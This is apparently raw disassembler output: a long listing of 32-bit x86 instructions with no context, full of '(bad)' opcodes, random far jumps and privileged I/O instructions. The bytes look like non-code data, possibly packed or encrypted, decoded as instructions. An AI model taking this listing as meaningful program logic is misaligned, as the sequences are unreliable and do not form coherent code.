  420c5b:	mul    ecx
  420c5d:	mov    eax,ds:0x438f3fe1
  420c62:	mov    al,ds:0xc3e1e452
  420c67:	push   0xef56a69e
  420c6c:	mov    esi,0x5058a306
  420c71:	inc    edx
  420c72:	popa   
  420c73:	inc    edi
  420c74:	jns    0x420c8f
  420c76:	clc    
  420c77:	std    
  420c78:	dec    edx
  420c79:	push   ds
  420c7a:	inc    ebp
  420c7b:	sbb    DWORD PTR [ebp+0x7ed8808a],edx
  420c81:	fld    TBYTE PTR [ebx+0x1bda6994]
  420c87:	retf   0x5bcf
  420c8a:	js     0x420c8c
  420c8c:	ss mov dl,0x30
  420c8f:	call   0x4db78044
  420c94:	shl    BYTE PTR [edi+0x3bc9fef1],0x4f
  420c9b:	ins    BYTE PTR es:[edi],dx
  420c9c:	push   ebx
  420c9d:	push   ebp
  420c9e:	xchg   BYTE PTR [ecx-0x78ce2ec3],dl
  420ca4:	mov    edi,0x562cc4db
  420ca9:	shl    cl,cl
  420cab:	cld    
  420cac:	shl    esi,0x62
  420caf:	pop    es
  420cb0:	(bad)  
  420cb1:	and    ecx,edi
  420cb3:	mov    eax,0xd927b340
  420cb8:	inc    eax
  420cb9:	aas    
  420cba:	lds    ecx,FWORD PTR ds:0xacd2e112
  420cc0:	shl    ebx,0x39
  420cc3:	sub    BYTE PTR [ecx-0x29],0x56
  420cc7:	jmp    DWORD PTR [ebp-0xe]
  420cca:	stos   DWORD PTR es:[edi],eax
  420ccb:	sbb    BYTE PTR [edx+0x34a344f0],dh
  420cd1:	aaa    
  420cd2:	push   esp
  420cd3:	inc    esp
  420cd4:	pop    es
  420cd5:	cmp    edx,ebx
  420cd7:	mov    cl,0x98
  420cd9:	cs aad 0x88
  420cdc:	aam    0x89
  420cde:	add    al,0x66
  420ce0:	xchg   BYTE PTR [ecx-0x57],al
  420ce3:	sub    esp,ecx
  420ce5:	mov    ebp,0x17a3fcce
  420cea:	test   BYTE PTR [esi-0x557b2a18],cl
  420cf0:	push   esi
  420cf1:	sbb    DWORD PTR [eax+0x49dcbdfe],edx
  420cf7:	jo     0x420d50
  420cf9:	retf   0x9c27
  420cfc:	jl     0x420cc4
  420cfe:	daa    
  420cff:	push   eax
  420d00:	add    ebx,DWORD PTR [ebx-0x45b64612]
  420d06:	fld    QWORD PTR [ebx+0x2]
  420d09:	xlat   BYTE PTR ds:[ebx]
  420d0a:	rcl    ah,1
  420d0c:	imul   BYTE PTR [ecx]
  420d0e:	mov    gs,ecx
  420d10:	fcomp  QWORD PTR [eax-0x2f]
  420d13:	mov    ebp,0x46ec4af3
  420d18:	cdq    
  420d19:	and    eax,0x2c6990fe
  420d1e:	jb     0x420d3f
  420d20:	pop    edi
  420d21:	inc    edi
  420d22:	push   0xf
  420d24:	sub    al,0x17
  420d26:	jl     0x420d1a
  420d28:	dec    edi
  420d29:	lahf   
  420d2a:	and    DWORD PTR [esi-0x7d],edi
  420d2d:	or     bl,bh
  420d2f:	mov    bh,0xcb
  420d31:	mov    esi,0x509a5bf1
  420d36:	outs   dx,BYTE PTR ds:[esi]
  420d37:	stc    
  420d38:	push   ebp
  420d39:	cwde   
  420d3a:	(bad)  
  420d3b:	loop   0x420d7e
  420d3d:	adc    eax,0x3bddb9d1
  420d42:	mov    esi,0xaae0ab1a
  420d47:	bound  edi,QWORD PTR [ecx+ebp*4+0x7]
  420d4b:	adc    DWORD PTR [ebp+0x4f],ebp
  420d4e:	dec    esi
  420d4f:	outs   dx,DWORD PTR ds:[esi]
  420d50:	fdiv   DWORD PTR [edx+edi*4-0x20c02c51]
  420d57:	(bad)  
  420d58:	addr16 mov dh,0x30
  420d5b:	xchg   esi,eax
  420d5c:	or     BYTE PTR [ebx-0x4f],bl
  420d5f:	xor    al,0x9
  420d61:	mov    esi,0x78aad3be
  420d66:	add    DWORD PTR [ebx+0x2a775a61],ebx
  420d6c:	retf   0x567f
  420d6f:	add    al,0x15
  420d71:	ss popa 
  420d73:	add    DWORD PTR [eax],edi
  420d75:	sbb    edi,eax
  420d77:	mov    al,ds:0xc7d26e48
  420d7c:	je     0x420d01
  420d7e:	adc    al,0x40
  420d80:	push   ebp
  420d81:	mov    al,ds:0x5326f91b
  420d86:	sub    BYTE PTR [eax+0x219c7afb],dh
  420d8c:	aam    0xc2
  420d8e:	pop    edi
  420d8f:	sub    DWORD PTR [ebp+0x7e291be1],esi
  420d95:	cwde   
  420d96:	lods   al,BYTE PTR ds:[esi]
  420d97:	jbe    0x420dca
  420d99:	sub    esp,DWORD PTR [edi+0x35577dc3]
  420d9f:	xchg   edi,eax
  420da0:	ror    BYTE PTR [eax],1
  420da2:	and    al,BYTE PTR [ebp+0x58]
  420da5:	repz loope 0x420d97
  420da8:	int3   
  420da9:	mov    bl,0xe5
  420dab:	loope  0x420db5
  420dad:	rcl    ebp,cl
  420daf:	lods   eax,DWORD PTR ds:[esi]
  420db0:	out    dx,al
  420db1:	fld    DWORD PTR [ebp+0x58d30d0b]
  420db7:	ins    DWORD PTR es:[edi],dx
  420db8:	lods   eax,DWORD PTR ds:[esi]
  420db9:	fdivr  QWORD PTR [esi+0x8]
  420dbc:	imul   ebx,DWORD PTR [edx+0xb],0x89de6761
  420dc3:	sar    BYTE PTR [esi],0x45
  420dc6:	rcl    BYTE PTR [ecx+0x3e],1
  420dc9:	xor    al,0x67
  420dcb:	add    al,0x91
  420dcd:	push   ebx
  420dce:	pushf  
  420dcf:	inc    esp
  420dd0:	les    ecx,FWORD PTR [ebx+0x24]
  420dd3:	or     BYTE PTR [eax+0x31],0x9b
  420dd7:	add    eax,0x6a342154
  420ddc:	and    BYTE PTR [ecx-0x25e8066f],0x9
  420de3:	bound  eax,QWORD PTR [ebp+0xde8dd8a]
  420de9:	es pop es
  420deb:	jne    0x420df3
  420ded:	inc    esi
  420dee:	(bad)  
  420df0:	outs   dx,DWORD PTR ds:[esi]
  420df1:	mov    esi,0x3f2c7f6c
  420df6:	lea    ebp,[ebx]
  420df8:	mov    esi,0x3a5f03a6
  420dfd:	jmp    0xbdfd:0x5c64f672
  420e04:	jo     0x420de3
  420e06:	outs   dx,DWORD PTR ds:[esi]
  420e07:	pop    eax
  420e08:	xor    eax,0xda536e47
  420e0d:	call   0x42effbb4
  420e12:	faddp  st(3),st
  420e14:	mov    ds:0x5bf7dc87,al
  420e19:	ja     0x420df9
  420e1b:	into   
  420e1c:	jle    0x420e93
  420e1e:	sub    cl,BYTE PTR [ebx-0x23]
  420e21:	cli    
  420e22:	cmc    
  420e23:	scas   eax,DWORD PTR es:[edi]
  420e24:	pop    es
  420e25:	repnz cwde 
  420e27:	cs retf 0x88c8
  420e2b:	jne    0x420e03
  420e2d:	mov    bl,0x6
  420e2f:	ja     0x420ddc
  420e31:	aas    
  420e32:	inc    eax
  420e33:	jge    0x420e69
  420e35:	add    eax,0xa00723ae
  420e3a:	sbb    DWORD PTR [ecx-0x3b],esi
  420e3d:	sub    BYTE PTR fs:[ebp-0x38],cl
  420e41:	cmp    dh,0xce
  420e44:	pop    ebp
  420e45:	xlat   BYTE PTR ds:[ebx]
  420e46:	call   0x5ca6:0x1b230159
  420e4d:	inc    ebx
  420e4e:	dec    ecx
  420e4f:	dec    esi
  420e50:	and    al,0x1
  420e52:	mov    ah,0xa4
  420e54:	jecxz  0x420e86
  420e56:	jne    0x420dfd
  420e58:	sbb    eax,0x298fadcf
  420e5d:	jbe    0x420e1d
  420e5f:	fsubr  QWORD PTR ds:0xd7e0ac57
  420e65:	fdivr  QWORD PTR [esi]
  420e67:	fist   DWORD PTR [ebp-0x7d]
  420e6a:	inc    eax
  420e6b:	dec    eax
  420e6c:	xor    eax,0x8ed93e0e
  420e71:	stc    
  420e72:	(bad)  
  420e73:	adc    DWORD PTR [ecx-0x61f4ca13],edx
  420e79:	dec    DWORD PTR [ebx-0x7e489f7]
  420e7f:	jmp    0x5f02:0x76462185
  420e86:	sahf   
  420e87:	call   ebp
  420e89:	scas   eax,DWORD PTR es:[edi]
  420e8a:	sbb    esi,ecx
  420e8c:	in     al,0xa1
  420e8e:	xchg   BYTE PTR [ecx-0x37],cl
  420e91:	adc    BYTE PTR [esi-0x6],bh
  420e94:	out    0x6,al
  420e96:	push   esp
  420e97:	push   esp
  420e98:	aam    0x23
  420e9a:	inc    ebp
  420e9b:	mov    al,0x51
  420e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e9e:	mov    ebp,0xb42d942d
  420ea3:	stc    
  420ea4:	mov    ecx,0x58dd461
  420ea9:	fistp  QWORD PTR [edi]
  420eab:	xchg   esp,eax
  420eac:	xor    DWORD PTR [esi],esp
  420eae:	sar    ebx,0x40
  420eb1:	sti    
  420eb2:	mov    esp,0xe4ae1e52
  420eb7:	mov    ebp,ebx
  420eb9:	shl    BYTE PTR [edi-0x4e],1
  420ebc:	(bad)  
  420ebd:	outs   dx,BYTE PTR ds:[esi]
  420ebe:	jae    0x420e48
  420ec0:	ret    
  420ec1:	icebp  
  420ec2:	mov    dl,0xd6
  420ec4:	xchg   esi,eax
  420ec5:	(bad)  
  420ec6:	aas    
  420ec7:	fidivr DWORD PTR ss:[edx+ebp*4+0xea4eb93]
  420ecf:	or     ah,dl
  420ed1:	arpl   dx,si
  420ed3:	popf   
  420ed4:	mov    cl,0x95
  420ed6:	mov    ds:0xa70caee3,eax
  420edb:	adc    eax,0xbd063663
  420ee0:	int3   
  420ee1:	push   cs
  420ee2:	mov    dh,0x24
  420ee4:	or     al,0x34
  420ee6:	pop    edi
  420ee7:	lea    ebp,[ebp+edi*2+0x39]
  420eeb:	in     al,dx
  420eec:	lahf   
  420eed:	fwait
  420eee:	dec    ebp
  420eef:	hlt    
  420ef0:	test   DWORD PTR [edi],eax
  420ef2:	mov    ah,0x28
  420ef4:	addr16 aad 0x4b
  420ef7:	fdivr  st(2),st
  420ef9:	pop    es
  420efa:	(bad)  
  420efb:	xor    BYTE PTR gs:0xe7432d1d,bl
  420f02:	sbb    esp,0x8e4cbe96
  420f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f09:	ret    0x7ee3
  420f0c:	leave  
  420f0d:	push   ebp
  420f0e:	fwait
  420f0f:	cld    
  420f10:	xlat   BYTE PTR ds:[ebx]
  420f11:	loope  0x420ebb
  420f13:	ss mov ch,0x66
  420f16:	and    esi,DWORD PTR [esi]
  420f18:	aaa    
  420f19:	pop    ebx
  420f1a:	repz (bad) 
  420f1c:	in     al,0x8d
  420f1e:	xchg   ebx,eax
  420f1f:	and    al,0xce
  420f21:	outs   dx,BYTE PTR ds:[esi]
  420f22:	mov    eax,0x9752f6b9
  420f27:	pop    esp
  420f28:	jecxz  0x420f55
  420f2a:	jnp    0x420f76
  420f2c:	mov    ah,bl
  420f2e:	mov    dl,0xf4
  420f30:	enter  0x768a,0x3a
  420f34:	stos   BYTE PTR es:[edi],al
  420f35:	(bad)  
  420f37:	test   BYTE PTR [ebp-0x38],bh
  420f3a:	and    DWORD PTR [ebp+0x4fbbaffc],esi
  420f40:	jno    0x420f4a
  420f42:	fimul  WORD PTR ds:0xf0eb81f7
  420f48:	xchg   esi,eax
  420f49:	in     eax,0xb1
  420f4b:	fadd   DWORD PTR [eax]
  420f4d:	mov    esp,0x2825146f
  420f52:	cmp    al,0x85
  420f54:	jle    0x420f2e
  420f56:	loop   0x420f14
  420f58:	pushf  
  420f59:	inc    esp
  420f5a:	outs   dx,BYTE PTR ds:[esi]
  420f5b:	shl    BYTE PTR [esi+eiz*8-0x57],0x5c
  420f60:	enter  0xc616,0xa9
  420f64:	pop    ecx
  420f65:	dec    ecx
  420f67:	cmp    eax,0xe43c952d
  420f6c:	das    
  420f6d:	out    dx,eax
  420f6e:	nop
  420f6f:	ret    0x55d2
  420f72:	pop    edi
  420f73:	(bad)  
  420f74:	lea    esi,[edi+esi*2-0x39]
  420f78:	repz dec edx
  420f7a:	pop    edi
  420f7b:	fcom   DWORD PTR [edi+ebp*1]
  420f7e:	outs   dx,BYTE PTR ds:[esi]
  420f7f:	psubq  mm5,QWORD PTR [ebp-0x511f2351]
  420f86:	push   edi
  420f87:	es dec ecx
  420f89:	dec    ecx
  420f8a:	mov    esp,0x609008fe
  420f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f90:	dec    esi
  420f91:	aad    0xd3
  420f93:	lods   al,BYTE PTR ds:[esi]
  420f94:	out    dx,al
  420f95:	(bad)  
  420f96:	cmpxchg DWORD PTR [ebp+0x78],esp
  420f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f9b:	jnp    0x420f5f
  420f9d:	and    edi,DWORD PTR [edx+0x1c]
  420fa0:	sub    DWORD PTR [esp+edi*4],eax
  420fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fa4:	mov    ecx,0xa26a4d16
  420fa9:	add    al,0xce
  420fab:	retf   
  420fac:	repz mov WORD PTR [ebx+0x2c1edc8d],es
  420fb3:	outs   dx,BYTE PTR ds:[esi]
  420fb4:	inc    ebx
  420fb5:	push   esi
  420fb6:	mov    esp,0x4a9cda26
  420fbb:	push   ebp
  420fbc:	jecxz  0x420fcc
  420fbe:	aaa    
  420fbf:	sbb    cl,BYTE PTR [edx]
  420fc1:	or     BYTE PTR [esi],ah
  420fc3:	jns    0x420f97
  420fc5:	xchg   esp,eax
  420fc6:	dec    ebp
  420fc7:	mov    dh,0xf8
  420fc9:	sub    al,0xf5
  420fcb:	or     al,0xe7
  420fcd:	push   esp
  420fce:	test   eax,0xcbeacc47
  420fd3:	int    0xbe
  420fd5:	dec    edx
  420fd6:	add    al,BYTE PTR [edi-0x70a6359f]
  420fdc:	mov    bl,0x5c
  420fde:	or     al,0xb2
  420fe0:	pop    ds
  420fe1:	inc    esi
  420fe2:	sub    dl,BYTE PTR [eax+edi*2]
  420fe5:	mov    ah,BYTE PTR [ebx+0x29]
  420fe8:	loop   0x420fba
  420fea:	cmp    DWORD PTR [edx],ebx
  420fec:	retf   0xcb75
  420fef:	sar    BYTE PTR [esi-0xf57226b],0x88
  420ff6:	gs push edx
  420ff8:	xor    BYTE PTR [edi+edi*4-0x63],ah
  420ffc:	ret    0x9f06
  420fff:	cmp    edx,esi
  421001:	add    al,0xb3
  421003:	xor    ebp,edi
  421005:	scas   al,BYTE PTR es:[edi]
  421006:	inc    esp
  421007:	and    BYTE PTR ds:0xa57b05da,cl
  42100d:	je     0x420fa5
  42100f:	inc    esp
  421010:	out    dx,eax
  421011:	push   esp
  421012:	pop    ecx
  421013:	inc    ecx
  421014:	sar    bh,1
  421016:	xlat   BYTE PTR ds:[ebx]
  421017:	push   ebp
  421018:	addr16 push edx
  42101a:	adc    BYTE PTR [esi+0x44],dl
  42101d:	cmp    edx,DWORD PTR [ecx-0x73]
  421020:	mov    dl,0xfc
  421022:	fwait
  421023:	das    
  421024:	mov    esp,0x8cf60cd
  421029:	sbb    eax,0xc67b83da
  42102e:	neg    eax
  421030:	adc    al,0xf3
  421032:	aaa    
  421033:	movsx  esi,BYTE PTR [edi-0x67]
  421037:	or     esi,DWORD PTR [ecx-0x26]
  42103a:	gs xor al,0xd4
  42103d:	std    
  42103e:	xlat   BYTE PTR ds:[ebx]
  42103f:	mov    di,WORD PTR [edi+ebx*1-0x35]
  421044:	mov    edi,0xd38c547c
  421049:	cmp    DWORD PTR [edx+eax*8],ebx
  42104c:	add    DWORD PTR [eax-0x48],eax
  42104f:	lea    ebx,[edi+0x5e]
  421052:	fiadd  WORD PTR [edx]
  421054:	xchg   ebp,eax
  421055:	add    BYTE PTR [edi],0x3
  421058:	fdivp  st(0),st
  42105a:	push   ebp
  42105b:	mov    al,ds:0x5bbe859c
  421060:	cmp    DWORD PTR [edx],0x5c
  421063:	and    dh,BYTE PTR [esi+0x5741310a]
  421069:	js     0x4210b3
  42106b:	ja     0x421043
  42106d:	inc    edi
  42106e:	inc    ebp
  42106f:	mov    edi,DWORD PTR [esi-0x29]
  421072:	mov    ebp,0xa0c8fe7a
  421077:	push   es
  421078:	aaa    
  421079:	(bad)  
  42107a:	icebp  
  42107b:	lods   al,BYTE PTR ds:[esi]
  42107c:	pop    ss
  42107d:	mov    ebx,0x58034131
  421082:	inc    ecx
  421083:	jmp    0xa23a5e0b
  421088:	mov    cl,0x61
  42108a:	add    eax,0xb1e8e990
  42108f:	dec    esp
  421090:	inc    ecx
  421091:	inc    edi
  421092:	cwde   
  421093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421094:	mov    ah,0xf2
  421096:	pop    eax
  421097:	xchg   esi,eax
  421098:	mov    cl,0x41
  42109a:	cmp    cl,ch
  42109c:	push   edx
  42109d:	sbb    bh,bl
  42109f:	test   eax,0xe793bf
  4210a4:	jle    0x4210a2
  4210a6:	add    BYTE PTR [edx+0x46bd302a],cl
  4210ac:	sub    dl,al
  4210ae:	sub    eax,DWORD PTR [esi+eiz*1]
  4210b1:	jnp    0x4210af
  4210b3:	dec    edi
  4210b4:	inc    eax
  4210b5:	adc    eax,0x45e6f943
  4210ba:	push   eax
  4210bb:	aad    0xff
  4210bd:	jecxz  0x4210ae
  4210bf:	jbe    0x4210c5
  4210c1:	(bad)  
  4210c2:	fmul   QWORD PTR [esi+0x14]
  4210c5:	stos   BYTE PTR es:[edi],al
  4210c6:	lods   eax,DWORD PTR ds:[esi]
  4210c7:	jp     0x42110b
  4210c9:	ja     0x42108b
  4210cb:	int    0x4
  4210cd:	fisttp WORD PTR [edi+edi*4+0x49ab66eb]
  4210d4:	and    ebx,DWORD PTR [edi]
  4210d6:	xlat   BYTE PTR ds:[ebx]
  4210d7:	mov    bh,0xd2
  4210d9:	mov    ebx,0x20dd45ad
  4210de:	shl    DWORD PTR [ebp-0x2],cl
  4210e1:	xchg   ebp,eax
  4210e2:	pop    esi
  4210e3:	add    DWORD PTR [edi],ecx
  4210e5:	inc    esp
  4210e6:	pop    esp
  4210e7:	mov    edx,0xff8e2ad6
  4210ec:	nop
  4210ed:	fcomip st,st(1)
  4210ef:	loop   0x4210e8
  4210f1:	loopne 0x42114e
  4210f3:	adc    DWORD PTR [ebp+0x1b1042c8],edx
  4210f9:	jp     0x4210d7
  4210fb:	fcomp  QWORD PTR [ebp+0x7f]
  4210fe:	inc    ecx
  4210ff:	add    BYTE PTR [ebx-0x42232cd],dl
  421105:	and    esi,DWORD PTR [edi]
  421107:	call   0x7fa3:0x75087066
  42110e:	sbb    al,0x3b
  421110:	xor    ebp,DWORD PTR [edx+eax*8]
  421113:	push   0xffffffb4
  421115:	inc    ecx
  421116:	stos   BYTE PTR es:[edi],al
  421117:	xchg   ecx,eax
  421118:	dec    ebp
  421119:	inc    ecx
  42111a:	aaa    
  42111b:	out    dx,eax
  42111c:	aas    
  42111d:	cmp    edi,esp
  42111f:	js     0x421171
  421121:	bound  ebx,QWORD PTR [ebx-0x47]
  421124:	mov    dh,0x77
  421126:	mov    ah,0xc2
  421128:	stos   DWORD PTR es:[edi],eax
  421129:	fistp  DWORD PTR [ecx+0x2]
  42112c:	xor    DWORD PTR [eax+eax*1+0x24],ebp
  421130:	adc    BYTE PTR [ebp+0x2c],0xbd
  421134:	(bad)  
  421135:	ss mov eax,0xc151eb8b
  42113b:	xchg   ecx,eax
  42113c:	pop    esi
  42113d:	popf   
  42113e:	jmp    0x4210d8
  421140:	and    dl,BYTE PTR [eax]
  421142:	(bad)  [eax+ebp*8+0xe]
  421146:	and    BYTE PTR [esi-0x71],bh
  421149:	jne    0x4210e7
  42114b:	test   ebp,esi
  42114d:	scas   al,BYTE PTR es:[edi]
  42114e:	cmp    ebp,DWORD PTR [edi-0x1046965c]
  421154:	mov    ecx,0xd214bd9f
  421159:	fadd   DWORD PTR [edi-0x6c608722]
  42115f:	and    DWORD PTR [ebx],ebp
  421161:	xchg   DWORD PTR [edi],eax
  421163:	jmp    0x6c04:0xe571d606
  42116a:	adc    ebx,DWORD PTR [esp+esi*1]
  42116d:	aam    0x7e
  42116f:	lds    ecx,FWORD PTR [esi]
  421171:	mov    al,ds:0xadec007f
  421176:	out    0xf6,eax
  421178:	add    al,0x31
  42117a:	xlat   BYTE PTR ds:[ebx]
  42117b:	mov    dh,0xdc
  42117d:	fiadd  WORD PTR [ebx+0x55]
  421180:	xchg   ebx,eax
  421181:	and    ebp,eax
  421183:	jno    0x4211eb
  421185:	mov    edx,0x2f7a86a7
  42118a:	push   edx
  42118b:	mov    al,ds:0x6c5898bf
  421190:	nop
  421191:	enter  0xb81a,0x3d
  421195:	pusha  
  421196:	sbb    dh,BYTE PTR [edi]
  421198:	xor    dh,0xaf
  42119b:	mov    dl,0x38
  42119d:	add    BYTE PTR [esi+0x55a0de02],0xaf
  4211a4:	jp     0x421187
  4211a6:	sbb    DWORD PTR [edx+0x4a],eax
  4211a9:	call   0x491b37ec
  4211ae:	pop    eax
  4211af:	mov    esp,ecx
  4211b1:	jge    0x4211b4
  4211b3:	sbb    al,0x37
  4211b5:	xlat   BYTE PTR ds:[ebx]
  4211b6:	aad    0xc
  4211b8:	inc    edi
  4211b9:	popa   
  4211ba:	in     al,0x37
  4211bc:	jno    0x4211cd
  4211be:	or     esi,DWORD PTR [ebx+ebp*1+0x9464ce]
  4211c5:	pop    edi
  4211c6:	mov    esi,0x66eea5f4
  4211cb:	hlt    
  4211cc:	in     eax,0xc2
  4211ce:	(bad)  [ebp-0x24984422]
  4211d4:	inc    esp
  4211d5:	pushf  
  4211d6:	mov    edi,?
  4211d8:	lods   al,BYTE PTR ds:[esi]
  4211d9:	dec    ebp
  4211da:	ffree  st(6)
  4211dc:	push   0xfffffffc
  4211de:	inc    edx
  4211df:	sbb    al,0x8b
  4211e1:	adc    ebx,edi
  4211e3:	es push edx
  4211e5:	enter  0xcee1,0x13
  4211e9:	popa   
  4211ea:	stos   DWORD PTR es:[edi],eax
  4211eb:	add    ebx,DWORD PTR [ecx+eiz*4-0x4f]
  4211ef:	ss jecxz 0x42124c
  4211f2:	adc    eax,0xa717753a
  4211f7:	push   es
  4211f8:	pusha  
  4211f9:	lods   eax,DWORD PTR ds:[esi]
  4211fa:	in     eax,dx
  4211fb:	jbe    0x421267
  4211fd:	push   cs
  4211fe:	pop    esp
  4211ff:	(bad)  
  421200:	dec    esp
  421201:	jne    0x42125f
  421203:	daa    
  421204:	ss sub DWORD PTR es:[ebx],ecx
  421208:	mov    esi,0xe717f1f8
  42120d:	inc    esp
  42120e:	inc    eax
  42120f:	or     bl,BYTE PTR [esi]
  421211:	dec    eax
  421212:	sub    dl,BYTE PTR [eax-0x5e707bb6]
  421218:	push   0xffffffeb
  42121a:	sar    DWORD PTR [esi+0x577711e1],1
  421220:	(bad)  
  421221:	xor    al,0xf4
  421223:	add    eax,esp
  421225:	cmp    BYTE PTR [esi+eiz*1+0x16],cl
  421229:	push   esp
  42122a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42122b:	loop   0x421296
  42122d:	test   eax,0xae591d3a
  421232:	inc    ebp
  421233:	in     al,0x1e
  421235:	in     eax,0x84
  421237:	inc    ebp
  421238:	dec    ebx
  421239:	mov    dh,0xe
  42123b:	xchg   DWORD PTR [eax-0x7928fe14],ecx
  421241:	or     BYTE PTR [eax+0x13],0xa3
  421245:	(bad)  
  421246:	jnp    0x4212b7
  421248:	cs clc 
  42124a:	cwde   
  42124b:	test   eax,0xc59ce8e0
  421250:	rol    bl,1
  421252:	(bad)  [eax-0x2a]
  421255:	dec    esp
  421256:	out    dx,eax
  421257:	mov    esi,0x447999c7
  42125c:	pop    es
  42125d:	retf   
  42125e:	mov    db1,edx
  421261:	int3   
  421262:	ret    0xc3de
  421265:	popf   
  421266:	stos   BYTE PTR es:[edi],al
  421267:	xchg   edx,eax
  421268:	in     eax,dx
  421269:	sbb    eax,0xf16cd17e
  42126e:	data16 mov ds:0xc033632c,al
  421274:	mov    dh,BYTE PTR [ebx+0x15]
  421277:	enter  0xb86f,0x81
  42127b:	scas   eax,DWORD PTR es:[edi]
  42127c:	jl     0x421285
  42127e:	js     0x421210
  421280:	sub    bh,BYTE PTR [ecx]
  421282:	rcr    dh,1
  421284:	pop    es
  421285:	inc    ebx
  421286:	adc    bl,dl
  421288:	fbld   TBYTE PTR [esp+ebp*8-0x2689f978]
  42128f:	dec    esi
  421290:	pop    eax
  421291:	xchg   bl,ah
  421293:	xchg   BYTE PTR ds:0xc99021f,ch
  421299:	out    0x53,al
  42129b:	cmp    esi,esi
  42129d:	and    ebx,ecx
  42129f:	pop    ebp
  4212a0:	add    bh,BYTE PTR [ebp+0x35]
  4212a3:	pop    edi
  4212a4:	mov    WORD PTR gs:[esp+ebx*2],?
  4212a8:	push   cs
  4212a9:	(bad)  
  4212aa:	jno    0x4212dc
  4212ac:	stos   DWORD PTR es:[edi],eax
  4212ad:	push   0xeecc707e
  4212b2:	stos   DWORD PTR es:[edi],eax
  4212b3:	pusha  
  4212b4:	jmp    0x91f87438
  4212b9:	mov    edx,ebx
  4212bb:	xor    BYTE PTR [edi+0x6f],cl
  4212be:	sahf   
  4212bf:	jg     0x421299
  4212c1:	scas   eax,DWORD PTR es:[edi]
  4212c2:	cwde   
  4212c3:	jmp    0x421309
  4212c5:	jb     0x42126a
  4212c7:	fdivr  st,st(4)
  4212c9:	jmp    0xa640:0x5a72cce2
  4212d0:	(bad)  
  4212d1:	fwait
  4212d2:	bound  edi,QWORD PTR [eax+edx*2-0x464a9331]
  4212d9:	mov    bh,0xce
  4212db:	add    al,0xb8
  4212dd:	repnz dec edx
  4212df:	mov    DWORD PTR [ebx+0x38],ecx
  4212e2:	inc    eax
  4212e3:	and    eax,0x3493d1a0
  4212e8:	leave  
  4212e9:	jmp    0x723bbe58
  4212ee:	cli    
  4212ef:	das    
  4212f0:	int    0x86
  4212f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212f3:	jmp    FWORD PTR [ebx+eiz*2-0x2531b984]
  4212fa:	mov    eax,0x42d57f8c
  4212ff:	lea    edi,[esi-0x4b11f8fc]
  421305:	popf   
  421306:	inc    eax
  421307:	adc    ch,dh
  421309:	mov    dl,dl
  42130b:	popa   
  42130c:	pop    ss
  42130d:	sbb    ebp,ebp
  42130f:	imul   ecx,DWORD PTR [eax+0x61],0xf67c0da4
  421316:	xor    al,0xb9
  421318:	ss push cs
  42131a:	int    0x99
  42131c:	add    DWORD PTR [edi-0x5f56d9d1],edi
  421322:	fistp  DWORD PTR [ecx]
  421324:	pusha  
  421325:	dec    ebx
  421326:	in     eax,dx
  421327:	push   cs
  421328:	and    al,dh
  42132a:	add    ax,WORD PTR [ebx+0x1c]
  42132e:	leave  
  42132f:	adc    BYTE PTR [edx+0x64d1d2a2],dl
  421335:	popf   
  421336:	leave  
  421337:	sar    BYTE PTR [esi+0x18b26739],cl
  42133d:	lea    edi,[edi-0x68a89283]
  421343:	jl     0x42132a
  421345:	sbb    eax,0x367bd529
  42134a:	not    BYTE PTR [edx-0x6772596f]
  421350:	add    dl,dl
  421352:	aam    0xa8
  421354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421355:	cmp    DWORD PTR [ebx-0x1],edi
  421358:	mov    ebx,0xf74ac15
  42135d:	leave  
  42135e:	pop    ebp
  42135f:	add    esp,ebx
  421361:	xchg   edi,eax
  421362:	lods   eax,DWORD PTR ds:[esi]
  421363:	adc    eax,0x2fd5c1d5
  421368:	bound  eax,QWORD PTR [eax-0x1f062930]
  42136e:	out    dx,al
  42136f:	xor    eax,esi
  421371:	cs jp  0x4213a0
  421374:	jge    0x4212f6
  421376:	sahf   
  421377:	stos   BYTE PTR es:[edi],al
  421378:	icebp  
  421379:	cmp    bl,bh
  42137b:	mov    edi,0xd581ca0e
  421380:	lea    eax,[ebp-0x63f9699b]
  421386:	call   0x87b9cb8
  42138b:	ret    
  42138c:	je     0x42132d
  42138e:	add    BYTE PTR [ecx+0x4d],al
  421391:	fadd   QWORD PTR [edx-0x36]
  421394:	mov    esi,0x91a0153b
  421399:	in     al,0x1a
  42139b:	lock fisub DWORD PTR [eax]
  42139e:	ret    
  42139f:	mov    bl,0xb
  4213a1:	mov    BYTE PTR [esi-0x7a0c9b72],cl
  4213a7:	imul   esp,edx,0xc0ec76d4
  4213ad:	inc    edi
  4213ae:	xor    esp,ecx
  4213b0:	cs jbe 0x42139b
  4213b3:	cwde   
  4213b4:	scas   al,BYTE PTR es:[edi]
  4213b5:	mov    DWORD PTR [ebp+edi*1-0x1b6f4c0],eax
  4213bc:	xchg   DWORD PTR [edi],edi
  4213be:	aas    
  4213bf:	xor    DWORD PTR [ebx+0x46],eax
  4213c2:	call   0xf9d9:0x3a27188c
  4213c9:	loop   0x4213f3
  4213cb:	mov    ebp,0x59fcf3f6
  4213d0:	shl    edi,1
  4213d2:	add    eax,DWORD PTR [ebx-0x3f]
  4213d5:	sbb    edx,eax
  4213d7:	or     BYTE PTR [eax],0xca
  4213da:	pop    edi
  4213db:	jl     0x42141a
  4213dd:	push   esi
  4213de:	lods   eax,DWORD PTR ds:[esi]
  4213df:	xchg   ebp,eax
  4213e0:	and    BYTE PTR [edi+eiz*2],bh
  4213e3:	sar    BYTE PTR [esi+eiz*1],1
  4213e6:	dec    DWORD PTR [ebx]
  4213e8:	xchg   edi,eax
  4213e9:	out    0x1,eax
  4213eb:	(bad)  
  4213ec:	mov    esp,0x19e1e27a
  4213f1:	cli    
  4213f2:	and    ecx,esp
  4213f4:	sbb    eax,0xa24cc613
  4213f9:	pop    ss
  4213fa:	cmc    
  4213fb:	push   ss
  4213fc:	into   
  4213fd:	xor    al,0x65
  4213ff:	std    
  421400:	loop   0x421410
  421402:	jns    0x421471
  421404:	sub    edi,DWORD PTR ds:0xbaffc57e
